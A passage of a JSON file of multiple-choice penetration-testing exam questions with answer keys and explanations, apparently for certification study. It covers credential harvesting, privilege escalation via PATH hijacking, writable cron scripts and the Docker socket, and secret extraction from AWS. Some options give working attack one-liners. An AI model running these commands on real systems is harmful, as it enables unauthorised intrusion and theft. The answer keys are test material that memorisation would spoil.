        "Install a library injection hook to capture keystrokes on terminal devices"
      ],
      "correctAnswerIndex": 3,
      "explanation": "The provided information shows several key details: the tester has low-privileged access, multiple users are actively connecting via SSH, and they don't have root access yet to modify system files. A library injection hook to capture keystrokes (like using LD_PRELOAD to hook terminal I/O functions) would be most effective as it can be implemented without root privileges and capture credentials entered by users in their terminal sessions. Compiling a kernel exploit might eventually work, but it's much more complex, potentially unstable, and overkill for simple credential harvesting. Adding a backdoored PAM module would require root privileges to modify PAM configuration files in /etc/pam.d/ or install new modules. Similarly, replacing the SSH binary (/usr/sbin/sshd) would require root privileges that the tester doesn't currently have. The library injection method can be applied to a user's own environment variables and affect processes they launch, making it the most viable option with the current access level.",
      "examTip": "When selecting post-exploitation techniques, always consider your current privilege level. Library injection attacks using LD_PRELOAD can often be performed with regular user privileges and are effective for capturing data from processes launched by that user."
    },
    {
      "id": 61,
      "question": "A penetration tester is conducting an API security assessment and notices the following request and response:\n\nRequest:\n```\nPOST /api/v1/users HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.IqT-7A-NRcp8QgvJHZ-zkx1bZr0f6ccPqIb6KzMpgHw\n\n{\"username\":\"newuser\",\"email\":\"user@example.com\"}\n```\n\nResponse:\n```\nHTTP/1.1 201 Created\nContent-Type: application/json\n\n{\"id\":1002,\"username\":\"newuser\",\"email\":\"user@example.com\",\"role\":\"user\",\"created_at\":\"2023-10-20T14:23:11Z\"}\n```\n\nWhich API security vulnerability should the tester investigate next?",
      "options": [
        "Mass assignment vulnerability by adding role and id fields in the request body",
        "BOLA vulnerability by modifying the id parameter in subsequent requests",
        "JWT token tampering by changing the role claim to admin",
        "API versioning bypass by trying the endpoint without the version prefix"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The API response shows that 'role' and 'id' fields are being assigned even though they weren't provided in the original request. This strongly indicates a potential mass assignment vulnerability (sometimes called auto-binding or object injection), where the server automatically binds all received parameters to a model without proper filtering. The tester should investigate whether adding 'role':'admin' to the request body would allow privilege escalation or if adding an 'id' field would allow overwriting existing users. BOLA (Broken Object Level Authorization) testing would be relevant for accessing other users' data but would be a different test from what's shown here. JWT token tampering is always worth testing but the shown interaction doesn't specifically indicate JWT vulnerabilities. API versioning bypass is less relevant as a primary attack vector here, as the immediate concern is the potential privilege escalation via mass assignment.",
      "examTip": "When testing APIs, always compare request and response bodies carefully to identify fields that appear in the response but weren't in the request. These often indicate mass assignment vulnerabilities that can lead to privilege escalation by injecting sensitive fields in subsequent requests."
    },
    {
      "id": 62,
      "question": "A penetration tester is evaluating a wireless network that uses WPA2-Enterprise with PEAP-MSCHAPv2 authentication. The client has specifically requested an assessment of the client-side security controls. Which attack methodology would be appropriate to evaluate the client-side security posture?",
      "options": [
        "Set up a rogue access point with the same SSID and capture authentication handshakes for offline cracking",
        "Conduct a deauthentication attack to force clients to reconnect, revealing PSK in handshakes",
        "Perform packet capture to identify pre-shared key transmission during handshakes",
        "Use Wireshark to capture EAPOL frames and extract the GTK for decryption"
      ],
      "correctAnswerIndex": 0,
      "explanation": "WPA2-Enterprise with PEAP-MSCHAPv2 is vulnerable to evil twin attacks if clients aren't properly validating server certificates. Setting up a rogue access point (evil twin) with the same SSID would allow testing whether clients properly validate server certificates before attempting authentication. If clients connect to the rogue AP, the tester could capture the MS-CHAPv2 handshake which contains the user's password hash that can be cracked offline. This tests a critical client-side security control: certificate validation. Deauthentication attacks would force reconnections, but WPA2-Enterprise doesn't use PSKs (Pre-Shared Keys) - it uses individual user credentials, making this approach incorrect. There is no pre-shared key in WPA2-Enterprise to capture during handshakes as mentioned in the third option. The fourth option is technically incorrect as the GTK (Group Temporal Key) is used for broadcast/multicast traffic encryption but capturing it wouldn't allow decryption of individual client traffic, and moreover wouldn't test client-side security controls specifically.",
      "examTip": "When testing WPA2-Enterprise security, the client-side certificate validation is often the weakest link. Clients that don't properly validate certificates before sending credentials are vulnerable to evil twin attacks regardless of the enterprise authentication backend's security."
    },
    {
      "id": 63,
      "question": "A penetration tester has exploited a file upload vulnerability on a PHP application. After uploading a web shell, they observe the following directory structure and permissions:\n\n```\n$ ls -la /var/www/html/\ntotal 36\ndrwxr-xr-x 6 www-data www-data 4096 Oct 15 09:23 .\ndrwxr-xr-x 3 root     root     4096 Jan 10  2023 ..\ndrwxr-xr-x 2 www-data www-data 4096 Jan 10  2023 admin\ndrwxr-xr-x 3 www-data www-data 4096 Jan 10  2023 css\n-rw-r--r-- 1 www-data www-data 2378 Jan 10  2023 index.php\ndrwxr-xr-x 2 www-data www-data 4096 Jan 10  2023 js\ndrwxrwxrwx 2 www-data www-data 4096 Oct 15 09:23 uploads\n-rw-r--r-- 1 root     root      612 Oct 15 08:42 config.php\n```\n\n```\n$ cat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:Regular User:/home/user:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n```\n\nWhich file should the tester target to gain additional credentials or access?",
      "options": [
        "config.php in the root web directory",
        "/home/user/.bash_history for command history",
        "/var/www/html/admin/users.php for admin credentials",
        "/etc/apache2/sites-enabled/000-default.conf for virtual host configuration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The config.php file is owned by root but is in the web directory, indicating it likely contains sensitive configuration information such as database credentials. While the file is readable by www-data (the web server user), it's notable that it's owned by root and has a recent modification time (Oct 15 08:42), suggesting it contains important configuration that required administrative access to modify. The .bash_history file would require accessing a different user's home directory, which likely requires privilege escalation beyond the current www-data access. The admin/users.php file isn't shown in the directory listing, making its existence speculative. The Apache configuration file would require access outside the web root, which isn't demonstrated by the current shell access. Given the available information and access level, the config.php file is the most immediately accessible target that is likely to contain valuable credentials for databases or other services.",
      "examTip": "During post-exploitation, prioritize examining files in the current accessible directory before attempting to access restricted locations. Configuration files, especially those owned by privileged users but readable by the web server, often contain credentials for databases or other services."
    },
    {
      "id": 64,
      "question": "A penetration tester executed multiple SQLMap commands against a web application and received the following results:\n\n```\n$ sqlmap -u \"https://example.com/product?id=42\" --banner\n...\n[*] starting @ 11:22:37\n[11:22:38] [INFO] testing connection to the target URL\n[11:22:39] [INFO] testing if the target URL content is stable\n[11:22:40] [INFO] target URL content is stable\n[11:22:40] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable\n[11:22:41] [INFO] testing for SQL injection on GET parameter 'id'\n[11:22:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[11:23:15] [CRITICAL] connection timed out to the target URL\n...\n\n$ sqlmap -u \"https://example.com/product?id=42\" --level=3 --risk=2\n...\n[11:25:02] [WARNING] GET parameter 'id' does not seem to be injectable\n...\n\n$ sqlmap -u \"https://example.com/search\" --data=\"query=test\" --method=POST\n...\n[11:28:17] [INFO] POST parameter 'query' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable\n[11:28:17] [INFO] going to use a web proxy for connection requests\n[11:28:17] [INFO] testing MySQL\n[11:28:18] [INFO] confirming MySQL\n[11:28:18] [INFO] the back-end DBMS is MySQL\n[11:28:18] [INFO] fetching banner\nbanner: '5.7.38-log'\n```\n\nBased on these results, what is the correct conclusion about the application's SQL injection vulnerabilities?",
      "options": [
        "The application is vulnerable to time-based blind SQL injection via POST parameter 'query', but not via GET parameter 'id'",
        "Both parameters are vulnerable but the WAF is blocking the GET-based attacks while allowing POST-based injections",
        "The application has no SQL injection vulnerabilities due to the connection timeout on the first test",
        "The GET parameter is susceptible to boolean-based blind injection while the POST parameter is vulnerable to time-based blind injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The SQLMap results clearly show that testing the GET parameter 'id' produced warnings that it 'might not be injectable' and 'does not seem to be injectable' even with increased testing levels (--level=3 --risk=2). However, when testing the POST parameter 'query', SQLMap successfully identified a 'MySQL >= 5.0.12 AND time-based blind' injection vulnerability and confirmed the backend is MySQL 5.7.38. This indicates that only the POST parameter is vulnerable to SQL injection, specifically time-based blind injection, while the GET parameter appears not to be vulnerable. The second option incorrectly assumes both parameters are vulnerable despite evidence to the contrary. The third option incorrectly concludes the application has no vulnerabilities, ignoring the successful POST parameter injection. The fourth option incorrectly states the GET parameter is vulnerable to boolean-based injection, which is not supported by the output.",
      "examTip": "When interpreting scanner results, pay close attention to different test methodologies against the same target. A vulnerability may exist in one parameter but not another, or may only be detectable using specific techniques like time-based blind injection when other methods fail."
    },
    {
      "id": 65,
      "question": "A penetration tester is analyzing the security of an organization's AWS infrastructure. The tester has compromised an EC2 instance with the following IAM role attached:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:ListBucket\",\n        \"s3:GetObject\",\n        \"ec2:DescribeInstances\",\n        \"secretsmanager:ListSecrets\",\n        \"secretsmanager:GetSecretValue\"\n      ],\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```\n\nWhich AWS command would extract the most sensitive information from this environment?",
      "options": [
        "aws secretsmanager get-secret-value --secret-id $(aws secretsmanager list-secrets --query 'SecretList[0].ARN' --output text)",
        "aws s3 sync s3://$(aws s3 ls | head -1 | awk '{print $3}') ./stolen-data/",
        "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,KeyName]' --output text",
        "aws iam get-account-password-policy --output json"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Based on the IAM policy, the instance has permission to list and retrieve secrets from AWS Secrets Manager, which typically contains highly sensitive information like database credentials, API keys, and other application secrets. The command 'aws secretsmanager get-secret-value --secret-id $(aws secretsmanager list-secrets --query 'SecretList[0].ARN' --output text)' first lists available secrets and then retrieves the value of the first secret found, which would likely contain credentials or keys that could be used for further access. The S3 command would download bucket contents, which could contain sensitive data, but typically operational secrets are stored in Secrets Manager rather than S3. The EC2 describe-instances command would only provide metadata about instances, including key names but not the actual SSH keys. The IAM get-account-password-policy command would attempt to retrieve password policy information, but the instance role doesn't have IAM permissions so this command would fail.",
      "examTip": "When compromising cloud infrastructure, prioritize access to dedicated secrets management services like AWS Secrets Manager or Azure Key Vault, as these typically contain the highest-value credentials that can be leveraged for privilege escalation or lateral movement."
    },
    {
      "id": 66,
      "question": "A penetration tester has gained a foothold on a Linux server and is conducting local enumeration. They discover an unusual setuid binary and analyze it with the following commands:\n\n```bash\n$ ls -la /usr/local/bin/custom_backup\n-rwsr-xr-x 1 root root 16824 Mar 15 2023 /usr/local/bin/custom_backup\n\n$ strings /usr/local/bin/custom_backup\n...\nsystem(\"tar -cf /tmp/backup.tar /var/www/html\");\n...\n\n$ ltrace /usr/local/bin/custom_backup\n...\nsystem(\"tar -cf /tmp/backup.tar /var/www/h\"...)  = 0\n...\n```\n\nWhat technique should be used to exploit this binary?",
      "options": [
        "Create a malicious 'tar' binary in a directory controlled by PATH manipulation",
        "Exploit environment variable expansion within the binary's system call",
        "Modify /tmp/backup.tar with a symbolic link to gain write access to protected files",
        "Use tar command line injection by creating files with special characters in their names"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The setuid binary is executing the 'tar' command without specifying the full path (not using '/bin/tar' but simply 'tar'). This indicates the binary relies on the PATH environment variable to locate the tar executable. A penetration tester can exploit this by creating a malicious script named 'tar' in a directory under their control, then manipulating the PATH environment variable to include their directory before the system directories. When the setuid program runs, it will execute the attacker's 'tar' script with root privileges. The second option about environment variable expansion isn't supported by the evidence - there's no indication of direct environment variable usage in the command. The third option about modifying the backup.tar file wouldn't grant additional privileges since the file is being created, not read, by the command. The fourth option about tar command injection through filenames would be relevant if the tester was controlling input to the tar command, but here the command arguments are hardcoded.",
      "examTip": "When analyzing setuid binaries, always check for relative paths in program execution. Commands executed without full paths are vulnerable to PATH manipulation attacks, which are among the easiest privilege escalation vectors to exploit."
    },
    {
      "id": 67,
      "question": "A penetration tester has gained access to a client's internal network and discovers a Jenkins CI/CD server. After exploring it, they find the following:\n\n1. The server allows anonymous read access to job configurations\n2. Several build jobs use the Pipeline script feature\n3. One job has build triggers configured to poll SCM every 5 minutes\n4. Another job has a webhook trigger configured for a Git repository\n\nWhich attack technique would provide the most reliable path to remote code execution on the Jenkins server?",
      "options": [
        "Create a malicious Groovy script in the Pipeline script section of a job that can be edited",
        "Exploit the webhook trigger by sending specially crafted HTTP requests to the Jenkins callback URL",
        "Inject commands into the SCM URL configuration by leveraging the polling feature",
        "Access the Jenkins Script Console through the management interface"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The information indicates that the tester can view job configurations (anonymous read access) and there are Pipeline script jobs, which use Groovy for configuration. If any of these jobs can be edited by the tester, modifying the Pipeline script provides a direct path to code execution, as Groovy scripts run directly on the Jenkins server with the privileges of the Jenkins process. Exploiting webhook triggers would require access to the Git repository or the ability to intercept and modify webhook traffic, which isn't indicated by the findings. Injecting commands into SCM URL configuration could potentially work but would likely be filtered or sanitized by the SCM polling mechanism. Accessing the Script Console typically requires administrative privileges, which aren't indicated in the scenario - anonymous access is mentioned only for reading job configurations, not for accessing management interfaces.",
      "examTip": "When testing CI/CD systems like Jenkins, prioritize examining Pipeline scripts, as these are essentially code that runs on the server itself. Even read-only access to configurations can reveal sensitive information like credentials, while write access to Pipeline scripts provides a direct path to command execution."
    },
    {
      "id": 68,
      "question": "A penetration tester is evaluating an IoT device and captures the following MQTT traffic:\n\n```\nTopic: home/livingroom/temperature\nMessage: 72.5\nQoS: 1\nRetain: true\n\nTopic: home/system/update\nMessage: {\"url\":\"https://updates.example.com/firmware/v2.1.0.bin\",\"hash\":\"a1b2c3d4e5f6\",\"version\":\"2.1.0\"}\nQoS: 2\nRetain: false\n\nTopic: home/+/switch\nMessage: ON\nQoS: 0\nRetain: false\n```\n\nWhat attack vector should the tester investigate?",
      "options": [
        "Message injection by publishing to the 'home/system/update' topic to deliver malicious firmware",
        "Denial of service by publishing retained messages to multiple topics with QoS 2",
        "Information disclosure by subscribing to the 'home/#' topic to capture all device data",
        "Authentication bypass by manipulating the QoS level of published messages"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The captured MQTT traffic shows a 'home/system/update' topic that contains a JSON message with firmware update information, including the URL to download new firmware. This presents a critical attack vector where the tester could potentially publish a malicious message to this topic with a URL pointing to attacker-controlled firmware. If the device accepts update commands from this topic without proper verification, the tester could potentially deliver malicious firmware to the device. Publishing retained messages with QoS 2 could potentially cause resource consumption but isn't the most severe attack vector compared to firmware manipulation. Information disclosure through subscribing to a wildcard topic ('home/#') is a valid concern but requires initial broker access and is a reconnaissance technique rather than an active attack. Authentication bypass by manipulating QoS levels isn't a standard MQTT attack vector - QoS levels affect delivery guarantees, not authentication mechanisms.",
      "examTip": "When testing IoT devices, always look for update mechanisms as primary attack vectors. Devices that accept update commands over insecure channels like unencrypted MQTT topics may allow delivery of malicious firmware, providing complete compromise of the device."
    },
    {
      "id": 69,
      "question": "A penetration tester is evaluating an OAuth 2.0 implementation and identifies an authorization endpoint at:\n`https://auth.example.com/oauth/authorize?client_id=CLIENT1234&redirect_uri=https://client.example.org/callback&response_type=code&scope=read`\n\nAfter manipulating the request parameters, the tester observes the following behavior:\n\n1. Changing `client_id` results in an error message\n2. Modifying `redirect_uri` to `https://attacker.com` results in an error\n3. Modifying `redirect_uri` to `https://client.example.org/callback/../../profile` succeeds and redirects\n4. Adding `&prompt=none` to the request succeeds without user interaction if there's an active session\n\nWhich OAuth vulnerability is present in this implementation?",
      "options": [
        "Improper redirect URI validation allowing path traversal",
        "Client ID enumeration through differential error messages",
        "Cross-site request forgery in the authorization flow",
        "Authentication bypass through prompt parameter manipulation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The test results show that the OAuth server is validating redirect URIs improperly. While it correctly blocks completely different domains (attacker.com), it fails to properly validate paths, allowing path traversal via '../../' in the URI. This is a significant vulnerability as it could allow attackers to redirect authorization codes to different endpoints on the legitimate client domain that might not be properly secured for handling OAuth flows, potentially leading to code theft. Client ID enumeration might be occurring but is less severe than the redirect vulnerability. There's no specific evidence of CSRF vulnerability in the authorization flow from the information provided. The prompt=none parameter is standard OAuth functionality for silent authentication when a session exists, not an authentication bypass vulnerability - it's expected behavior that requests with prompt=none succeed without interaction when there's an active session.",
      "examTip": "When testing OAuth implementations, always try path traversal and subdomain variations in redirect URIs. Many OAuth servers validate only the domain portion of redirect URIs and fail to properly validate the path, allowing attackers to redirect OAuth codes or tokens to unintended endpoints."
    },
    {
      "id": 70,
      "question": "A penetration tester is assessing a microservice architecture and receives the following response from an internal API:\n\n```\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Thu, 20 Oct 2023 10:15:30 GMT\nContent-Type: application/json\nX-Powered-By: Express\nX-Service: inventory-api\nX-Request-ID: 7b44a2f2-6328-4a41-90c5-19f60c3db2d1\n\n{\n  \"error\": \"Cannot connect to database\",\n  \"stacktrace\": [\"Error: connect ECONNREFUSED 10.0.12.24:5432\", \"at TCPConnectWrap.afterConnect [as oncomplete] (node:net:1161:16)\", \"at Pool.connection (/app/node_modules/pg-pool/index.js:47:12)\", \"at /app/services/db.js:42:28\"],\n  \"database_config\": {\n    \"host\": \"10.0.12.24\",\n    \"port\": 5432,\n    \"user\": \"inventory_svc\",\n    \"password\": \"S3rv1ceP@55w0rd\",\n    \"database\": \"inventory_prod\"\n  }\n}\n```\n\nWhat critical security issue does this response reveal?",
      "options": [
        "Sensitive credential exposure through error messages",
        "Server-side request forgery vulnerability in the database connection",
        "Improper access control allowing unauthenticated API access",
        "Cross-origin resource sharing misconfiguration exposing internal APIs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The API response exposes critical sensitive information in the error message, specifically including database credentials (username 'inventory_svc' and password 'S3rv1ceP@55w0rd') in the 'database_config' section of the error. This is a significant security issue as it leaks production credentials that could be used to directly access the database if the tester can reach the database server at 10.0.12.24:5432. There's no evidence of SSRF vulnerability from this response alone - the database connection error is a standard error when a service can't reach its database. While unauthenticated API access might be occurring, the response itself doesn't explicitly confirm this is unexpected behavior - many internal APIs don't require authentication between microservices. There's no information about CORS configuration in the response headers, so we can't determine if there's a CORS misconfiguration.",
      "examTip": "Pay close attention to error responses from APIs, especially in microservice architectures. Detailed error messages, stack traces, and verbose logging can expose sensitive information like database credentials, internal network topology, and application architecture that can be leveraged for further attacks."
    },
    {
      "id": 71,
      "question": "A penetration tester is examining the boot sequence of an embedded Linux device. They extract the following snippet from the device's init script:\n\n```bash\n#!/bin/sh\n# Initialize device and start services\necho \"Starting device initialization...\"\n\n# Configure network interfaces\n/sbin/ifconfig eth0 up\n/sbin/ifconfig eth0 192.168.1.10 netmask 255.255.255.0\n\n# Start telnet service for debugging\n/usr/sbin/telnetd -l /bin/sh\n\n# Start main application\ncd /opt/device/bin\n./device_control_app -c /etc/device/config.xml &\n\n# Start web admin interface\n/usr/bin/lighttpd -f /etc/lighttpd/lighttpd.conf\n```\n\nWhat security vulnerability is present in this initialization script?",
      "options": [
        "The device starts a telnet server exposing an unauthenticated shell",
        "The web server runs with root privileges, allowing privilege escalation",
        "The network interface uses a predictable static IP address",
        "The device control application reads from an unencrypted configuration file"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The init script starts a telnet daemon (telnetd) with a direct shell (/bin/sh) as its login program (-l /bin/sh). This configuration bypasses authentication and provides immediate shell access to anyone who can connect to the telnet port, representing a critical security vulnerability. The web server (lighttpd) is started, but there's no evidence it runs with root privileges - in fact, embedded systems often drop privileges for services. While using a static IP address is deterministic, it's not inherently a security vulnerability and is common practice in embedded devices. An unencrypted configuration file is a potential security concern but less severe than an unauthenticated remote shell, and there's no evidence in the snippet that the configuration contains sensitive information.",
      "examTip": "When assessing embedded devices, always check initialization scripts and service configurations for debugging interfaces that might be left enabled. Telnet, SSH, and serial consoles without proper authentication are common critical findings in embedded device penetration tests."
    },
    {
      "id": 72,
      "question": "A penetration tester has gained initial access to a Linux system and is conducting privilege escalation enumeration. They run the following commands to check for scheduled tasks:\n\n```bash\n$ ls -la /etc/cron*\n-rw-r--r-- 1 root root    722 Nov 12  2022 /etc/crontab\n\n$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n* *     * * *   root    /usr/local/bin/backup.sh\n\n$ ls -la /usr/local/bin/backup.sh\n-rwxr-xr-x 1 root dev 255 Oct 10 11:05 /usr/local/bin/backup.sh\n\n$ cat /usr/local/bin/backup.sh\n#!/bin/bash\n# Daily backup script\ntar -czf /var/backups/daily_backup.tar.gz /var/www/html\nchown root:root /var/backups/daily_backup.tar.gz\nchmod 600 /var/backups/daily_backup.tar.gz\necho \"Backup completed: $(date)\" >> /var/log/backup.log\n\n$ id\nuid=1000(user) gid=1000(user) groups=1000(user),27(sudo),999(dev)\n```\n\nWhat privilege escalation vector is present on this system?",
      "options": [
        "The backup.sh script is writable by members of the dev group",
        "The /etc/crontab file has incorrect permissions allowing modification",
        "The PATH variable in crontab can be manipulated for privilege escalation",
        "The run-parts command has a vulnerability allowing command injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command output shows that the penetration tester is a member of the 'dev' group (groups=1000(user),27(sudo),999(dev)), and the backup.sh script is owned by root but writable by the dev group (permissions -rwxr-xr-x, owned by root:dev). Since the script runs as root via cron (every minute based on '* * * * * root /usr/local/bin/backup.sh'), the tester can modify it to include commands that will be executed with root privileges. This is a clear privilege escalation vector. The /etc/crontab file has standard permissions (rw-r--r--) and is not writable by regular users. The PATH variable defined in crontab uses standard system directories and doesn't include user-writable locations. There's no indication of a run-parts vulnerability from the provided information - run-parts is a standard utility for executing scripts in cron.hourly, cron.daily, etc. directories.",
      "examTip": "Always check group memberships when conducting privilege escalation enumeration. Being part of groups like 'dev', 'staff', or 'adm' can provide write access to files executed by privileged users or processes, creating privilege escalation opportunities."
    },
    {
      "id": 73,
      "question": "A penetration tester is analyzing a captured SAML assertion and identifies the following fragment:\n\n```xml\n<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75\" Version=\"2.0\" IssueInstant=\"2023-09-28T15:23:08Z\">\n  <saml:Issuer>https://idp.example.org/SAML2</saml:Issuer>\n  <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n    <ds:SignedInfo>\n      <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n      <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n      <ds:Reference URI=\"#_d71a3a8e9fcc45c9e9d248ef7049393fc8f04e5f75\">\n        <ds:Transforms>\n          <ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/>\n          <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n        </ds:Transforms>\n        <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/>\n        <ds:DigestValue>ThIGGLeasHE9gzzUxpzKRC937Yk=</ds:DigestValue>\n      </ds:Reference>\n    </ds:SignedInfo>\n    <ds:SignatureValue>GBkZhBU8PuYNZxpzMCbWkYCVRdFoUbRcPt7UnxJA7CtXFvYmPSNv8uR3QIaEfqQPQJl4TbuQ4vJ+8YKdRQb7n0+GXhQ0MEWjA+5CbhNK6UPz0xn0bhMQ21pvXgUOVxkU53dPjjZZ5RbqkL4YWXZt3nVYl/fEq7PNJYiR9BQeSzA=</ds:SignatureValue>\n  </ds:Signature>\n  <saml:Subject>\n    <saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">user@example.org</saml:NameID>\n    <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n      <saml:SubjectConfirmationData NotOnOrAfter=\"2023-09-28T15:33:08Z\" Recipient=\"https://sp.example.com/SAML2/SSO/POST\"/>\n    </saml:SubjectConfirmation>\n  </saml:Subject>\n  <saml:Conditions NotBefore=\"2023-09-28T15:18:08Z\" NotOnOrAfter=\"2023-09-28T15:33:08Z\">\n    <saml:AudienceRestriction>\n      <saml:Audience>https://sp.example.com/SAML2</saml:Audience>\n    </saml:AudienceRestriction>\n  </saml:Conditions>\n  <saml:AuthnStatement AuthnInstant=\"2023-09-28T15:23:08Z\" SessionIndex=\"_be9967abd904ddcae3c0eb4189adbe3f71e327cf93\">\n    <saml:AuthnContext>\n      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>\n    </saml:AuthnContext>\n  </saml:AuthnStatement>\n</saml:Assertion>\n```\n\nWhat security vulnerability is present in this SAML assertion?",
      "options": [
        "The signature uses the insecure SHA-1 hashing algorithm",
        "The assertion contains an expired validity timeframe",
        "The NameID format allows for XML external entity attacks",
        "The audience restriction is missing, allowing assertion reuse"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The SAML assertion's signature uses insecure cryptographic algorithms, specifically SHA-1 for both the digest method (<ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/>) and as part of the signature method (<ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>). SHA-1 is considered cryptographically broken and should not be used for digital signatures, as it's vulnerable to collision attacks. The assertion's validity timeframe is set from 2023-09-28T15:18:08Z to 2023-09-28T15:33:08Z (NotBefore and NotOnOrAfter attributes in the Conditions element), which doesn't indicate it's expired without knowing the current time. The NameID format is using a standard emailAddress format which doesn't introduce XXE vulnerabilities. The audience restriction is present in the assertion (<saml:AudienceRestriction><saml:Audience>https://sp.example.com/SAML2</saml:Audience></saml:AudienceRestriction>), properly limiting where the assertion can be used.",
      "examTip": "When analyzing SAML assertions, always check the cryptographic algorithms used for signatures. Legacy algorithms like SHA-1 and MD5 are vulnerable to collision attacks, which could potentially allow an attacker to forge SAML assertions."
    },
    {
      "id": 74,
      "question": "A penetration tester is assessing a web application and discovers that it uses JWT for authentication. The tester captures the following token:\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n```\n\nThe tester attempts various JWT attacks and makes the following observations:\n\n1. Changing the algorithm from HS256 to 'none' results in a rejected token\n2. Attempting a brute force attack with common secrets fails to find a match\n3. The application doesn't accept expired tokens or tokens with modified content\n4. When sending a request with a modified header to specify RS256 instead of HS256, using the same signature, the application accepts the token\n\nWhat vulnerability is present in the application's JWT implementation?",
      "options": [
        "Algorithm confusion vulnerability allowing signature verification bypass",
        "Inadequate signature validation permitting arbitrary header manipulation",
        "Missing expiration claim enabling token reuse",
        "Weak secret key susceptible to offline brute force attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The observations indicate an algorithm confusion vulnerability in the JWT implementation. When the tester changed the algorithm from HS256 (HMAC with SHA-256) to RS256 (RSA with SHA-256) while keeping the same signature, the application accepted the token. This suggests the application is using the public key as an HMAC secret when validating the RS256 signature. This is a classic algorithm confusion vulnerability where the application doesn't properly validate that the algorithm in use matches the expected algorithm, allowing an attacker who knows the public key to forge tokens. The application correctly rejects 'none' algorithm and modified content, showing some validation occurs. The brute force attempt failed, suggesting the secret isn't weak. There's no information about missing expiration claims - in fact, observation #3 indicates expired tokens are rejected.",
      "examTip": "When testing JWT implementations, always check for algorithm confusion vulnerabilities by changing the algorithm type (e.g., from HS256 to RS256) while keeping the same signature. Many applications fail to validate that the algorithm in use matches what's expected, allowing attackers to bypass signature verification."
    },
    {
      "id": 75,
      "question": "A penetration tester has gained access to a Linux system and is conducting post-exploitation enumeration. They run the following commands:\n\n```bash\n$ ps aux | grep docker\nroot      1234  0.0  0.3 1152116 108196 ?      Ssl  Oct20   0:16 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock\nroot      5678  0.0  0.1 776668 42788 ?       Ssl  Oct20   0:07 /usr/bin/containerd\n\n$ ls -la /var/run/docker.sock\nsrw-rw---- 1 root docker 0 Oct20 08:15 /var/run/docker.sock\n\n$ id\nuid=1000(developer) gid=1000(developer) groups=1000(developer),998(docker)\n```\n\nWhich command should the tester execute to most effectively escalate privileges on this system?",
      "options": [
        "docker run -v /:/host -it ubuntu chroot /host /bin/bash",
        "docker exec -it $(docker ps | grep app | awk '{print $1}') /bin/bash",
        "docker build -t privesc - < <(echo 'FROM ubuntu:latest\\nRUN useradd -m -s /bin/bash -u 0 hacker\\nUSER hacker')",
        "docker network create --driver=bridge --subnet=172.16.0.0/24 --gateway=172.16.0.1 privesc"
      ],
      "correctAnswerIndex": 0,
